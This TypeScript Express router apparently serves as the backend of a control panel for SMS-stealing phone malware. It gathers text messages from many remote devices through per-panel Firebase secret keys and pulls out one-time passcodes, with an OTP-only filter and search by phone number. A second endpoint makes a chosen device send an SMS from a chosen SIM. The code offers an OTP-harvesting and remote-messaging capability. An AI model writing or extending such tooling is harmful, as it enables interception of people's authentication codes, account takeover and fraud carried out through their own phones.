import { Router, type IRouter } from "express";
import { eq } from "drizzle-orm";
import { db, panelsTable } from "@workspace/db";
import { fetchDeviceSms, fetchPanelDevices, sendSmsViaFirebase } from "../lib/firebase";

const router: IRouter = Router();

function extractOtp(text: string): string | null {
  return text.match(/\b(\d{4,8})\b/)?.[1] ?? null;
}

router.get("/sms-console", async (req, res): Promise<void> => {
  const q = String(req.query.q || "").trim().toLowerCase();
  const otpOnly = String(req.query.otpOnly || "") === "1";
  const limit = Math.min(Math.max(parseInt(String(req.query.limit || "300"), 10) || 300, 20), 1000);
  const panels = await db.select().from(panelsTable).orderBy(panelsTable.createdAt);

  const rows = (await Promise.all(panels.map(async (panel) => {
    const devices = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
    return (await Promise.all(devices.map(async (device) => {
      const messages = await fetchDeviceSms(panel.firebaseUrl, panel.secretKey, device.id);
      return messages.slice(0, 30).map((message) => {
        const otp = extractOtp(message.text);
        return {
          panelId: panel.id,
          panelName: panel.name,
          deviceId: device.id,
          deviceName: device.name || device.model || device.id,
          phoneNumber: device.phoneNumber,
          status: device.status,
          sender: message.sender,
          text: message.text,
          otp,
          time: message.time,
          timestampMs: message.timestampMs,
        };
      });
    }))).flat();
  }))).flat();

  const filtered = rows
    .filter((row) => !otpOnly || row.otp)
    .filter((row) => {
      if (!q) return true;
      return [
        row.panelName,
        row.deviceId,
        row.deviceName,
        row.phoneNumber,
        row.sender,
        row.otp || "",
        row.text,
      ].some((value) => String(value || "").toLowerCase().includes(q));
    })
    .sort((a, b) => (b.timestampMs ?? 0) - (a.timestampMs ?? 0))
    .slice(0, limit);

  res.json({ total: filtered.length, messages: filtered });
});

router.post("/sms-console/send", async (req, res): Promise<void> => {
  const panelId = parseInt(String(req.body?.panelId || ""), 10);
  const deviceId = String(req.body?.deviceId || "").trim();
  const to = String(req.body?.to || "").replace(/\D/g, "");
  const message = String(req.body?.message || "").trim();
  const simSlot = Math.max(1, parseInt(String(req.body?.simSlot || "1"), 10) || 1);

  if (!panelId || !deviceId || !to || !message) {
    res.status(400).json({ error: "Panel, device, number and message are required" });
    return;
  }

  const [panel] = await db.select().from(panelsTable).where(eq(panelsTable.id, panelId));
  if (!panel) {
    res.status(404).json({ error: "Panel not found" });
    return;
  }

  const ok = await sendSmsViaFirebase(panel.firebaseUrl, panel.secretKey, deviceId, to, message, simSlot);
  if (!ok) {
    res.status(502).json({ error: "Firebase send command failed" });
    return;
  }
  res.json({ ok: true });
});

export default router;
